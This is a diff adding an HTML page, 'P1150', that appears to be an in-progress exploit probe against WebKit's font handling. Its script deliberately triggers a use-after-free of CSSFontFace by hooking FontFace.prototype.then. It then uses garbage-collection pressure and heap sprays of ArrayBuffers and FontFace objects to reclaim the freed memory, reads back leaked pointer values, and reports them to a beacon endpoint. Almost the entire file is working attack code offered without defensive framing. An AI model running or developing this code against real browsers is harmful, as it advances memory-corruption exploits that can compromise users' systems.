@@ -1,0 +1,196 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>P1150</title>
+<style>*{margin:0;padding:0;box-sizing:border-box}body{background:#0a0a0f;color:#c8ffc8;font:11px/1.4 monospace;padding:10px;min-height:100vh}#log{white-space:pre-wrap;word-break:break-all}.ok{color:#6f6}.fail{color:#f66}.ptr{color:#f6f}.info{color:#6cf}.phase{color:#fff;font-size:13px;font-weight:bold;margin:6px 0}.win{color:#0f0;font-weight:bold;font-size:14px}</style>
+</head><body><div id="log"></div>
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);}
+function B(t,d){try{new Image().src='/beacon.php?tag='+encodeURIComponent(t)+'&data='+encodeURIComponent(d||'')+'&_='+Math.random();}catch(e){}}
+function hex64(v){if(typeof v==='bigint'){var s=v.toString(16);while(s.length<16)s='0'+s;return'0x'+s;}return'0x0';}
+
+log('phase','=== P1150: DELAYED SPRAY + SAME-TYPE RECLAIM ===');
+log('info','Hypothesis: ArrayBuffer is in GigaCage, CSSFontFace in bmalloc');
+log('info','Test A: delayed ArrayBuffer spray (after GC frees CSSFontFace)');
+log('info','Test B: same-type FontFace spray (bypasses GigaCage)');
+B('P1150-START','t='+Date.now());
+
+var r=Date.now()%100000;
+var uafHit=false;
+
+// Create font
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:z"+r+";src:local(Arial);unicode-range:U+0042}";
+document.head.appendChild(st);
+var ff=new FontFace('y'+r,'local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(ff);void ff.loaded;
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,get:function(){
+  if(uafHit)return undefined;uafHit=true;
+  // DON'T save wrapper, DON'T spray here
+  // Just free: remove style + delete from fonts
+  if(st.parentNode)st.remove();
+  try{document.fonts.delete(this);}catch(e){}
+  document.body.offsetHeight;
+  return undefined;
+},set:function(){}});
+
+document.fonts.load('1em y'+r+', z'+r,'AB').then(function(){},function(){});
+
+// === Test A: Delayed ArrayBuffer spray (wait for GC to free CSSFontFace) ===
+setTimeout(function(){
+  delete FontFace.prototype.then;
+  B('P1150-UAF','hit='+uafHit);
+  if(!uafHit){B('P1150-DONE','nohit');return;}
+
+  log('phase','--- Test A: GC pressure then delayed ArrayBuffer spray ---');
+
+  // Heavy GC pressure to trigger collection of the freed CSSFontFace
+  var gcTrash=[];
+  for(var g=0;g<2000;g++){
+    gcTrash.push({a:new ArrayBuffer(64),b:String(g).repeat(10)});
+  }
+  gcTrash=null; // drop all refs
+
+  // More GC pressure - create and immediately discard
+  for(var g=0;g<5000;g++){var tmp=new ArrayBuffer(128);tmp=null;}
+  for(var g=0;g<2000;g++){var tmp2=new Array(50);tmp2=null;}
+
+  // NOW spray ArrayBuffers
+  var abSpray=[];
+  for(var k=0;k<300;k++) abSpray.push(new ArrayBuffer(192));
+
+  // Check for non-zero values
+  var abHits=0;
+  var abFP=[];
+  for(var k=0;k<abSpray.length;k++){
+    var v=new BigUint64Array(abSpray[k]);
+    for(var q=0;q<24;q++){
+      if(v[q]!==0n){
+        abHits++;
+        if(abFP.length<3){
+          var vals=[];for(var i=0;i<24;i++)vals.push(hex64(v[i]));
+          abFP.push({idx:k,vals:vals});
+        }
+        break;
+      }
+    }
+  }
+
+  log(abHits>0?'win':'info','Test A: ArrayBuffer reclaim='+abHits+'/300');
+  B('P1150-A-RESULT','reclaim='+abHits);
+
+  if(abHits>0){
+    for(var i=0;i<abFP.length;i++){
+      var f=abFP[i];
+      B('P1150-A-FP-'+i,'idx='+f.idx);
+      B('P1150-A-V0-'+i,f.vals.slice(0,6).join('|'));
+      B('P1150-A-V1-'+i,f.vals.slice(6,12).join('|'));
+      B('P1150-A-V2-'+i,f.vals.slice(12,18).join('|'));
+      B('P1150-A-V3-'+i,f.vals.slice(18,24).join('|'));
+      log('ptr','buf['+f.idx+']: q0-5='+f.vals.slice(0,6).join(' '));
+      log('ptr','  q6-11='+f.vals.slice(6,12).join(' '));
+    }
+  }
+
+  // === Test B: Same-type FontFace spray ===
+  log('phase','--- Test B: Same-type FontFace spray ---');
+
+  var ffSpray=[];
+  for(var k=0;k<100;k++){
+    var name='sp'+r+'x'+k;
+    try{
+      var nf=new FontFace(name,'local(Arial)',{
+        style:'italic',
+        weight:String(100+k),
+        display:'swap',
+        unicodeRange:'U+00'+((k%16)<10?'0'+(k%16):String.fromCharCode(55+(k%16)))+'0'
+      });
+      ffSpray.push({ff:nf,name:name,wt:String(100+k)});
+    }catch(e){}
+  }
+
+  B('P1150-B-SPRAY','count='+ffSpray.length);
+
+  // Check spray FontFaces for corruption
+  var ffHits=0;
+  var ffDetails=[];
+  for(var k=0;k<ffSpray.length;k++){
+    var s=ffSpray[k];
+    var corrupted=false;
+    var fam='',style='',wt='',disp='';
+    try{fam=s.ff.family;}catch(e){fam='ERR';corrupted=true;}
+    try{style=s.ff.style;}catch(e){style='ERR';corrupted=true;}
+    try{wt=s.ff.weight;}catch(e){wt='ERR';corrupted=true;}
+    try{disp=s.ff.display;}catch(e){disp='ERR';corrupted=true;}
+
+    // Check for unexpected values
+    if(fam!==s.name)corrupted=true;
+    if(style!=='italic')corrupted=true;
+    if(wt!==s.wt)corrupted=true;
+    if(disp!=='swap')corrupted=true;
+
+    if(corrupted){
+      ffHits++;
+      if(ffDetails.length<5){
+        ffDetails.push({idx:k,exp:s.name,fam:fam,style:style,wt:wt,disp:disp});
+      }
+    }
+  }
+
+  log(ffHits>0?'win':'info','Test B: FontFace corruption='+ffHits+'/'+ffSpray.length);
+  B('P1150-B-RESULT','corrupt='+ffHits);
+
+  if(ffHits>0){
+    log('win','!!! SAME-TYPE CONFUSION DETECTED !!!');
+    for(var i=0;i<ffDetails.length;i++){
+      var d=ffDetails[i];
+      log('ptr','ff['+d.idx+']: exp='+d.exp+' got fam='+d.fam+' style='+d.style+' wt='+d.wt+' disp='+d.disp);
+      B('P1150-B-CORRUPT-'+i,'idx='+d.idx+'|exp='+d.exp+'|fam='+d.fam+'|wt='+d.wt);
+    }
+  }
+
+  // === Test C: Check freed font properties via fonts.check ===
+  log('phase','--- Test C: fonts.check with freed font name ---');
+  var checkResult='';
+  try{
+    var cr=document.fonts.check('1em y'+r);
+    checkResult='check='+cr;
+  }catch(e){checkResult='ERR:'+e.message.substring(0,40);}
+  log('info','fonts.check: '+checkResult);
+  B('P1150-C-CHECK',checkResult);
+
+  // Also try: iterate document.fonts
+  var fontCount=0;
+  try{
+    document.fonts.forEach(function(f){fontCount++;});
+  }catch(e){}
+  log('info','document.fonts count='+fontCount);
+  B('P1150-C-FONTS','count='+fontCount);
+
+  // === Test D: Second delayed spray after longer wait ===
+  log('phase','--- Test D: Second delayed spray (extra GC time) ---');
+
+  // Release Test A spray
+  abSpray=null;
+  // More GC pressure
+  for(var g=0;g<3000;g++){var tmp3=new ArrayBuffer(256);tmp3=null;}
+
+  var abSpray2=[];
+  for(var k=0;k<200;k++) abSpray2.push(new ArrayBuffer(192));
+
+  var ab2Hits=0;
+  for(var k=0;k<abSpray2.length;k++){
+    var v=new BigUint64Array(abSpray2[k]);
+    for(var q=0;q<24;q++){
+      if(v[q]!==0n){ab2Hits++;break;}
+    }
+  }
+  log(ab2Hits>0?'win':'info','Test D: 2nd ArrayBuffer reclaim='+ab2Hits+'/200');
+  B('P1150-D-RESULT','reclaim='+ab2Hits);
+
+  // Summary
+  var summary='A:'+abHits+'|B:'+ffHits+'|D:'+ab2Hits;
+  log('phase','=== SUMMARY: '+summary+' ===');
+  B('P1150-SUMMARY',summary);
+  B('P1150-DONE','complete');
+},150);
+</script></body></html>
